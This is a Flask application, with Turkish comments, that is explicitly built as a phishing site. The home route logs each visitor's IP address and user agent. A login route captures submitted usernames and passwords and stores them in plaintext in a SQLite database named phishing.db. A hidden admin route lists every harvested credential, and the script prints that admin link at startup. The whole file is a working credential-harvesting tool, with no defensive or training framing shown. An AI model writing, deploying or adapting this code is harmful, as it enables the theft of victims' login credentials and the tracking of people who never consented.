from flask import Flask, render_template, request, redirect
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os
from config import SECRET_ADMIN_PATH

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///phishing.db'
db = SQLAlchemy(app)

# Veritabanı modeli
class Visitor(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(100))
    user_agent = db.Column(db.String(300))
    username = db.Column(db.String(100))
    password = db.Column(db.String(100))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

# Phishing sayfası
@app.route("/")
def home():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    log = Visitor(ip=ip, user_agent=user_agent)
    db.session.add(log)
    db.session.commit()
    return render_template("phishing.html")

# Form gönderildiğinde
@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    log = Visitor(ip=ip, user_agent=user_agent, username=username, password=password)
    db.session.add(log)
    db.session.commit()
    return render_template("success.html")

# Admin panel
@app.route(f"/admin/{SECRET_ADMIN_PATH}")
def admin():
    visitors = Visitor.query.order_by(Visitor.timestamp.desc()).all()
    return render_template("admin.html", visitors=visitors)

if __name__ == "__main__":
    if not os.path.exists("phishing.db"):
        with app.app_context():
            db.create_all()
    print(f"Admin Panel Linkin: http://127.0.0.1:5000/admin/{SECRET_ADMIN_PATH}")
    app.run(debug=True)
